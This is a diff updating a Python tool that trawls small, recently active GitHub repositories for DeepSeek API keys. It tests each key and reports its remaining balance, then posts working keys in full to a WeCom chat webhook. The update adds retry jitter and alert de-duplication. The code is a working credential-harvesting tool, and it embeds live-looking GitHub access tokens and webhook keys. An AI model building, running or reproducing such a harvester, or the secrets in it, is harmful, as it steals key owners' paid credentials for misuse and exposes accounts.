@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-DeepSeek API Key Leak Scanner — Async 3.1
-全异步架构：并行关键词搜索 + 流式仓库扫描 + 智能令牌池
-双 Webhook：日志/进度推送 + API Key 泄漏告警
+DeepSeek API Key Leak Scanner — Async 3.2 (Production Ready)
+全异步架构：并行关键词搜索 + 流式仓库扫描 + 智能令牌池 + 智能重试抖动 + 告警去重
 """
 
 import os
@@ -13,7 +12,8 @@ import asyncio
 import logging
 import sys
 import time
-from datetime import datetime, timedelta
+import random
+from datetime import datetime, timedelta, timezone
 from urllib.parse import quote
 import aiohttp
 from aiohttp import ClientTimeout, TCPConnector
@@ -23,17 +23,11 @@ from aiohttp import ClientTimeout, TCPConnector
 # ==========================================
 
 DEFAULT_TOKENS = (
-    "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,"
-    "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,"
-    "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,"
-    "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,"
-    "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"
+    "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"
 )
 
 # ---- 双 Webhook 配置 ----
-# 日志/进度 Webhook：启动通知、每轮统计、扫描进度、Token 状态等
 DEFAULT_LOG_WEBHOOK = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=64eea423-1a95-482b-b5ed-05339da5c819"
-# 告警 Webhook：仅推送捕获到的有效 API Key 泄漏
 DEFAULT_ALERT_WEBHOOK = "https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=e0778177-d8de-4f4d-8866-3471f6e7cc67"
 
 GITHUB_TOKENS_ENV = os.getenv("GITHUB_TOKENS", DEFAULT_TOKENS)
@@ -41,17 +35,17 @@ GITHUB_TOKENS = [t.strip() for t in GITHUB_TOKENS_ENV.split(",") if t.strip()]
 WECOM_LOG_WEBHOOK = os.getenv("WECOM_LOG_WEBHOOK", DEFAULT_LOG_WEBHOOK)
 WECOM_ALERT_WEBHOOK = os.getenv("WECOM_ALERT_WEBHOOK", DEFAULT_ALERT_WEBHOOK)
 
-# 并发控制 — 高并发
-MAX_SEARCH_CONCURRENT = 10          # 同时进行的搜索请求数
-MAX_REPO_SCAN_CONCURRENT = 30       # 同时扫描的仓库数
-MAX_FILE_SCAN_CONCURRENT = 50       # 每个仓库内同时扫描的文件数
-MAX_KEY_VERIFY_CONCURRENT = 20      # 同时验证的 Key 数
-SEARCH_PER_PAGE = 100               # 每页搜索结果数 (GitHub 最大 100)
-MAX_SEARCH_PAGES = 5                # 每个关键词最多翻几页
+# 并发控制
+MAX_SEARCH_CONCURRENT = 10          
+MAX_REPO_SCAN_CONCURRENT = 30       
+MAX_FILE_SCAN_CONCURRENT = 50       
+MAX_KEY_VERIFY_CONCURRENT = 20      
+SEARCH_PER_PAGE = 100               
+MAX_SEARCH_PAGES = 5                
 
-# 进度推送间隔：每扫 N 个仓库或每隔 M 秒推送一次进度
-PROGRESS_REPO_INTERVAL = 5          # 每 5 个仓库推送一次进度
-PROGRESS_TIME_INTERVAL = 30         # 最长 30 秒推送一次进度
+# 进度推送间隔
+PROGRESS_REPO_INTERVAL = 5          
+PROGRESS_TIME_INTERVAL = 30         
 
 # ==========================================
 # 关键词矩阵
@@ -80,6 +74,7 @@ logger = logging.getLogger(__name__)
 DATA_DIR = "/data" if os.path.exists("/data") else "."
 SEEN_KEYS_FILE = os.path.join(DATA_DIR, "seen_keys.json")
 SEEN_REPOS_FILE = os.path.join(DATA_DIR, "seen_repos.json")
+SENT_ALERTS_FILE = os.path.join(DATA_DIR, "sent_alerts.json")  # 告警去重持久化文件
 
 TARGET_EXTS = (
     '.py', '.js', '.json', '.env', '.yml', '.yaml', '.txt', '.ts',
@@ -89,7 +84,7 @@ TARGET_EXTS = (
 )
 
 DEEPSEEK_KEY_RE = re.compile(r'(?<![a-zA-Z0-9_-])(sk-[a-zA-Z0-9]{32,48})(?![a-zA-Z0-9_-])')
-SKIP_KEY_PATTERNS = re.compile(r'test|example|xxxx|1234|placeholder|your.key|demo|sample', re.IGNORECASE)
+SKIP_KEY_PATTERNS = re.compile(r'test|example|xxxx|1234|placeholder|your\.key|demo|sample', re.IGNORECASE)
 
 
 # ==========================================
@@ -107,7 +102,6 @@ class TokenPool:
         self._lock = asyncio.Lock()
 
     def status_summary(self):
-        """返回 Token 池状态摘要"""
         now = time.time()
         parts = []
         for i, s in enumerate(self._pool.values()):
@@ -120,7 +114,6 @@ class TokenPool:
         return " | ".join(parts)
 
     async def acquire(self):
-        """获取一个可用的 token，必要时等待"""
         while True:
             async with self._lock:
                 now = time.time()
@@ -140,30 +133,38 @@ class TokenPool:
                 for s in self._pool.values()
             )
             wait = max(min_wait, 0.1)
-            logger.debug(f"⏳ 所有 Token 繁忙，等待 {wait:.1f}s ...")
             await asyncio.sleep(wait)
 
     async def update(self, _token, state, headers):
-        """根据响应头更新 token 状态"""
         async with self._lock:
             remaining = headers.get("X-RateLimit-Remaining")
             reset_at = headers.get("X-RateLimit-Reset")
             if remaining is not None:
-                state["remaining"] = int(remaining)
+                try:
+                    state["remaining"] = int(remaining)
+                except ValueError:
+                    pass
             if reset_at is not None:
-                state["reset_at"] = int(reset_at)
+                try:
+                    state["reset_at"] = int(reset_at)
+                except ValueError:
+                    pass
 
     async def mark_rate_limited(self, token, state, retry_after=None):
-        """标记 token 被限速"""
         async with self._lock:
-            wait = int(retry_after) if retry_after else 60
+            try:
+                base_wait = int(retry_after) if retry_after else 60
+            except ValueError:
+                base_wait = 60
+            # 引入随机抖动 (±20%) 避免惊群效应
+            wait = base_wait * random.uniform(0.8, 1.2)
             state["locked_until"] = time.time() + wait
             state["remaining"] = 0
-            logger.warning(f"🚫 Token {token[:20]}... 被限速 {wait}s")
+            logger.warning(f"🚫 Token {token[:15]}... 被限速，将等待 {wait:.1f}s")
 
 
 # ==========================================
-# 异步 HTTP 客户端
+# 异步 HTTP 客户端（含重试抖动）
 # ==========================================
 
 class AsyncGitHubClient:
@@ -175,7 +176,6 @@ class AsyncGitHubClient:
         self._sem_search = asyncio.Semaphore(MAX_SEARCH_CONCURRENT)
         self._sem_repo = asyncio.Semaphore(MAX_REPO_SCAN_CONCURRENT)
         self._sem_verify = asyncio.Semaphore(MAX_KEY_VERIFY_CONCURRENT)
-        # WeChat webhook 消息队列（避免并发写）
         self._wecom_lock_log = asyncio.Lock()
         self._wecom_lock_alert = asyncio.Lock()
 
@@ -200,8 +200,8 @@ class AsyncGitHubClient:
             await self._session.close()
 
     async def _request(self, url, accept_raw=False):
-        """带令牌池和重试的异步请求"""
-        for attempt in range(3):
+        max_attempts = 3
+        for attempt in range(max_attempts):
             token, state = await self.token_pool.acquire()
             headers = {
                 "Authorization": f"token {token}",
@@ -213,26 +213,15 @@ class AsyncGitHubClient:
                     await self.token_pool.update(token, state, resp.headers)
 
                     if resp.status == 200:
-                        return await (resp.text() if accept_raw else resp.json())
+                        if accept_raw:
+                            return await resp.text()
+                        else:
+                            return await resp.json()
 
-                    elif resp.status == 401:
-                        logger.error(f"❌ Token 失效: {token[:20]}...")
-                        await self.token_pool.mark_rate_limited(token, state, 3600)
-                        if attempt < 2:
-                            continue
-                        return None
-
-                    elif resp.status == 403:
+                    elif resp.status in (401, 403, 429):
                         retry_after = resp.headers.get("Retry-After", "60")
                         await self.token_pool.mark_rate_limited(token, state, retry_after)
-                        if attempt < 2:
-                            continue
-                        return None
-
-                    elif resp.status == 429:
-                        retry_after = resp.headers.get("Retry-After", "10")
-                        await self.token_pool.mark_rate_limited(token, state, retry_after)
-                        if attempt < 2:
+                        if attempt < max_attempts - 1:
                             continue
                         return None
 
@@ -240,20 +229,18 @@ class AsyncGitHubClient:
                         return None
 
                     else:
-                        logger.debug(f"HTTP {resp.status} for {url[:80]}")
                         return None
 
-            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-                logger.debug(f"请求异常: {e}")
-                if attempt < 2:
-                    await asyncio.sleep(0.5)
+            except (aiohttp.ClientError, asyncio.TimeoutError):
+                if attempt < max_attempts - 1:
+                    # 指数退避 + 随机抖动重试
+                    sleep_time = (2 ** attempt) + random.uniform(0.1, 0.5)
+                    await asyncio.sleep(sleep_time)
                     continue
                 return None
-
         return None
 
     async def search_repos(self, keyword, time_threshold, page=1):
-        """异步搜索仓库"""
         query = f"{keyword} stars:<20 pushed:>{time_threshold}"
         url = (
             f"https://api.github.com/search/repositories"
@@ -263,18 +250,15 @@ class AsyncGitHubClient:
             return await self._request(url)
 
     async def get_tree(self, owner, repo, branch):
-        """获取仓库文件树"""
         url = f"https://api.github.com/repos/{owner}/{repo}/git/trees/{branch}?recursive=1"
         async with self._sem_repo:
             return await self._request(url)
 
     async def fetch_file(self, owner, repo, branch, path):
-        """获取文件原始内容"""
         url = f"https://api.github.com/repos/{owner}/{repo}/contents/{path}?ref={branch}"
         return await self._request(url, accept_raw=True)
 
     async def verify_key(self, key):
-        """验证 DeepSeek API Key"""
         async with self._sem_verify:
             try:
                 headers = {"Authorization": f"Bearer {key}"}
@@ -290,34 +274,31 @@ class AsyncGitHubClient:
                 pass
             return False, "无效"
 
-    # ---- 双通道 WeChat 推送 ----
-
     async def send_log(self, content):
-        """推送日志/进度到企业微信 (日志 Webhook)"""
         await self._send_wecom(WECOM_LOG_WEBHOOK, content, self._wecom_lock_log)
 
     async def send_alert(self, content):
-        """推送 API Key 告警到企业微信 (告警 Webhook)"""
         await self._send_wecom(WECOM_ALERT_WEBHOOK, content, self._wecom_lock_alert)
 
     async def _send_wecom(self, webhook_url, content, lock):
-        """内部发送方法"""
         if not webhook_url:
             return
-        try:
-            msg = {"msgtype": "markdown", "markdown": {"content": content}}
-            async with lock:
-                async with self._session.post(
-                    webhook_url, json=msg,
-                    timeout=ClientTimeout(total=5)
-                ):
-                    pass
-        except Exception:
-            pass
+        for attempt in range(2):
+            try:
+                msg = {"msgtype": "markdown", "markdown": {"content": content}}
+                async with lock:
+                    async with self._session.post(
+                        webhook_url, json=msg,
+                        timeout=ClientTimeout(total=5)
+                    ) as resp:
+                        if resp.status == 200:
+                            return
+            except Exception:
+                await asyncio.sleep(1 + random.random())
 
 
 # ==========================================
-# 核心扫描引擎
+# 核心扫描引擎（含告警去重）
 # ==========================================
 
 class DeepSeekScanner:
@@ -325,28 +306,32 @@ class DeepSeekScanner:
         self.client = client
         self.seen_keys = self._load_json_set(SEEN_KEYS_FILE)
         self.seen_repos = self._load_json_set(SEEN_REPOS_FILE)
-        self.time_threshold = (datetime.utcnow() - timedelta(days=30)).strftime('%Y-%m-%dT%H:%M:%SZ')
+        self.sent_alerts = self._load_json_set(SENT_ALERTS_FILE)  # 告警去重集合
+        self.time_threshold = (datetime.now(timezone.utc) - timedelta(days=30)).strftime('%Y-%m-%dT%H:%M:%SZ')
         self.stats = {"keys_found": 0, "keys_valid": 0, "repos_scanned": 0, "rounds": 0}
+        self._file_lock = asyncio.Lock()
 
     @staticmethod
     def _load_json_set(path):
         if os.path.exists(path):
             try:
-                with open(path, 'r') as f:
+                with open(path, 'r', encoding='utf-8') as f:
                     return set(json.load(f))
             except Exception:
                 pass
         return set()
 
-    def _save_json(self, path, data):
-        try:
-            with open(path, 'w') as f:
-                json.dump(list(data), f)
-        except Exception as e:
-            logger.error(f"保存文件失败 {path}: {e}")
+    async def _save_json_async(self, path, data):
+        async with self._file_lock:
+            try:
+                def _write():
+                    with open(path, 'w', encoding='utf-8') as f:
+                        json.dump(list(data), f)
+                await asyncio.to_thread(_write)
+            except Exception as e:
+                logger.error(f"保存文件失败 {path}: {e}")
 
     def _is_target_file(self, path):
-        """判断文件是否值得扫描"""
         lower = path.lower()
         if lower.endswith(TARGET_EXTS):
             return True
@@ -355,7 +340,6 @@ class DeepSeekScanner:
         return False
 
     async def _scan_repo_files(self, owner, repo, branch, files):
-        """并行扫描仓库内所有目标文件"""
         sem = asyncio.Semaphore(MAX_FILE_SCAN_CONCURRENT)
 
         async def scan_one(filepath):
@@ -383,9 +367,8 @@ class DeepSeekScanner:
         return all_keys
 
     async def _verify_and_report(self, owner, repo, filepath, key):
-        """验证 Key 并发送告警到告警 Webhook"""
         self.seen_keys.add(key)
-        self._save_json(SEEN_KEYS_FILE, self.seen_keys)
+        await self._save_json_async(SEEN_KEYS_FILE, self.seen_keys)
         self.stats["keys_found"] += 1
 
         logger.info(f"🎯 捕获疑似 Key: {key[:8]}... 来源: {owner}/{repo}/{filepath}")
@@ -394,18 +377,26 @@ class DeepSeekScanner:
         if valid:
             self.stats["keys_valid"] += 1
             logger.warning(f"✅ 有效 Key! {key[:8]}...{key[-4:]} 余额: {balance}")
-            # 有效 Key 推送到告警 Webhook
-            await self.client.send_alert(
-                f"🚨 **DeepSeek Key 泄漏**\n"
-                f"> **状态**: ✅ 有效 (余额: {balance})\n"
-                f"> **仓库**: [{owner}/{repo}](https://github.com/{owner}/{repo})\n"
-                f"> **文件**: `{filepath}`\n"
-                f"> **凭证**: `{key}`"
-            )
+
+            # -------------------------------------------------------------
+            # 逻辑修复：告警去重检查（防止同一个 Key 在多个地方泄漏被反复轰炸）
+            # -------------------------------------------------------------
+            if key not in self.sent_alerts:
+                self.sent_alerts.add(key)
+                await self._save_json_async(SENT_ALERTS_FILE, self.sent_alerts)
+                await self.client.send_alert(
+                    f"🚨 **DeepSeek Key 泄漏**\n"
+                    f"> **状态**: ✅ 有效 (余额: {balance})\n"
+                    f"> **仓库**: [{owner}/{repo}](https://github.com/{owner}/{repo})\n"
+                    f"> **文件**: `{filepath}`\n"
+                    f"> **凭证**: `{key}`"
+                )
+            else:
+                logger.info(f"ℹ️ 该有效 Key 已在历史中报警过，跳过重复推送: {key[:8]}...")
+
         return valid
 
     async def process_repo(self, repo):
-        """处理单个仓库，返回 (repo_fullname, found_keys_count) 供进度上报"""
         repo_id = repo["id"]
         if repo_id in self.seen_repos:
             return None
@@ -418,12 +409,10 @@ class DeepSeekScanner:
         branch = repo.get("default_branch", "main")
         full_name = f"{owner}/{name}"
 
-        # 获取文件树
         tree_data = await self.client.get_tree(owner, name, branch)
         if not tree_data or "tree" not in tree_data:
             return (full_name, 0)
 
-        # 筛选目标文件，最多 150 个
         target_files = [
             it["path"] for it in tree_data["tree"]
             if it.get("type") == "blob" and self._is_target_file(it["path"])
@@ -432,12 +421,10 @@ class DeepSeekScanner:
         if not target_files:
             return (full_name, 0)
 
-        # 并行扫描所有文件
         found = await self._scan_repo_files(owner, name, branch, target_files)
         if not found:
             return (full_name, 0)
 
-        # 并行验证所有 Key
         verify_tasks = [
             self._verify_and_report(owner, name, fp, key)
             for fp, key in found
@@ -447,7 +434,6 @@ class DeepSeekScanner:
         return (full_name, len(found))
 
     async def _search_keyword_pages(self, keyword):
-        """搜索一个关键词的所有分页"""
         all_repos = []
         for page in range(1, MAX_SEARCH_PAGES + 1):
             data = await self.client.search_repos(keyword, self.time_threshold, page)
@@ -461,21 +447,18 @@ class DeepSeekScanner:
         return keyword, all_repos
 
     async def run_once(self):
-        """一轮完整扫描：所有关键词并行搜索 -> 流式处理仓库（带进度推送）"""
         self.stats["rounds"] += 1
         round_num = self.stats["rounds"]
         round_start = time.time()
 
         logger.info(f"═══ 第 {round_num} 轮扫描开始 ═══")
 
-        # 阶段 1: 所有关键词并行搜索
         search_tasks = [
             self._search_keyword_pages(kw)
             for kw in AI_KEYWORDS
         ]
         search_results = await asyncio.gather(*search_tasks, return_exceptions=True)
 
-        # 汇总所有仓库（去重）
         all_repos = {}
         for result in search_results:
             if isinstance(result, Exception):
@@ -489,7 +472,6 @@ class DeepSeekScanner:
         total_repos = len(new_repos)
         logger.info(f"📂 第 {round_num} 轮: 发现 {total_repos} 个新仓库，开始极速扫描...")
 
-        # ---- 推送到日志 Webhook: 轮次开始 ----
         ts = datetime.now().strftime('%H:%M:%S')
         await self.client.send_log(
             f"🔍 **第 {round_num} 轮扫描开始** [{ts}]\n"
@@ -497,20 +479,17 @@ class DeepSeekScanner:
             f"> Token 状态: {self.client.token_pool.status_summary()}"
         )
 
-        # 阶段 2: 并行处理所有仓库（信号量控制并发），并实时上报进度
         if not new_repos:
-            self._save_json(SEEN_REPOS_FILE, self.seen_repos)
+            await self._save_json_async(SEEN_REPOS_FILE, self.seen_repos)
             elapsed = time.time() - round_start
             logger.info(f"✅ 第 {round_num} 轮: 无新仓库 | 耗时 {elapsed:.1f}s")
             return
 
         sem = asyncio.Semaphore(MAX_REPO_SCAN_CONCURRENT)
-
-        # 进度追踪
         completed = 0
         progress_lock = asyncio.Lock()
         last_push_time = time.time()
-        recent_repos = []  # 最近完成的一批仓库名
+        recent_repos = []
 
         async def process_with_limit(repo):
             nonlocal completed, last_push_time
@@ -522,13 +501,11 @@ class DeepSeekScanner:
                     logger.error(f"仓库处理异常: {e}")
                     result = (f"{repo.get('owner',{}).get('login','?')}/{repo.get('name','?')}", 0)
 
-            # 更新进度
             async with progress_lock:
                 completed += 1
                 if result:
                     recent_repos.append(result[0])
                 now = time.time()
-                # 每 N 个仓库或每 M 秒推送一次进度
                 if (completed % PROGRESS_REPO_INTERVAL == 0) or \
                    (now - last_push_time >= PROGRESS_TIME_INTERVAL) or \
                    (completed == total_repos):
@@ -536,11 +513,8 @@ class DeepSeekScanner:
                     recent_repos.clear()
                     last_push_time = now
 
-        # 发射所有仓库扫描任务
         await asyncio.gather(*[process_with_limit(r) for r in new_repos])
-
-        # 持久化
-        self._save_json(SEEN_REPOS_FILE, self.seen_repos)
+        await self._save_json_async(SEEN_REPOS_FILE, self.seen_repos)
 
         elapsed = time.time() - round_start
         logger.info(
@@ -551,7 +525,6 @@ class DeepSeekScanner:
             f"耗时: {elapsed:.1f}s"
         )
 
-        # ---- 推送到日志 Webhook: 轮次结束 ----
         ts_end = datetime.now().strftime('%H:%M:%S')
         await self.client.send_log(
             f"✅ **第 {round_num} 轮扫描完成** [{ts_end}]\n"
@@ -564,12 +537,9 @@ class DeepSeekScanner:
         )
 
     async def _push_progress(self, round_num, completed, total, repo_names, last_push_time, now):
-        """推送扫描进度到日志 Webhook"""
         pct = completed * 100 // total if total > 0 else 0
         interval = now - last_push_time
-
-        # 取最近完成的仓库名（截断显示）
-        name_list = "、".join(f"`{n}`" for n in repo_names[-5:])  # 最多展示最近 5 个
+        name_list = "、".join(f"`{n}`" for n in repo_names[-5:])
         if not name_list:
             name_list = "—"
 
@@ -586,21 +556,21 @@ class DeepSeekScanner:
 
 async def main():
     token_pool = TokenPool(GITHUB_TOKENS)
-    logger.info(f"🚀 DeepSeek 全网盲扫机 3.1 启动 | Tokens: {len(GITHUB_TOKENS)} | 关键词: {len(AI_KEYWORDS)}")
+    logger.info(f"🚀 DeepSeek 全网盲扫机 3.2 启动 | Tokens: {len(GITHUB_TOKENS)} | 关键词: {len(AI_KEYWORDS)}")
     logger.info(f"📡 日志 Webhook: {'已配置' if WECOM_LOG_WEBHOOK else '未配置'}")
     logger.info(f"🚨 告警 Webhook: {'已配置' if WECOM_ALERT_WEBHOOK else '未配置'}")
 
     async with AsyncGitHubClient(token_pool) as client:
         scanner = DeepSeekScanner(client)
 
-        # ---- 启动通知 -> 日志 Webhook ----
         ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         await client.send_log(
-            f"🔥 **DeepSeek 全网盲扫机 3.1 启动**\n"
+            f"🔥 **DeepSeek 全网盲扫机 3.2 启动**\n"
             f"> 启动时间: {ts}\n"
             f"> GitHub Tokens: **{len(GITHUB_TOKENS)}** 个\n"
             f"> 关键词矩阵: **{len(AI_KEYWORDS)}** 个\n"
             f"> 架构: asyncio + aiohttp 全异步\n"
+            f"> 新增特性: 告警去重过滤 + 智能抖动退避重试\n"
             f"> 搜索范围: 低星(<20) + 最近30天更新\n"
             f"> 日志推送: ✅ 已就绪\n"
             f"> 告警推送: ✅ 已就绪"
@@ -616,7 +586,6 @@ async def main():
                 )
                 await asyncio.sleep(5)
 
-            # 几乎无间隔
             await asyncio.sleep(0.1)
 
 
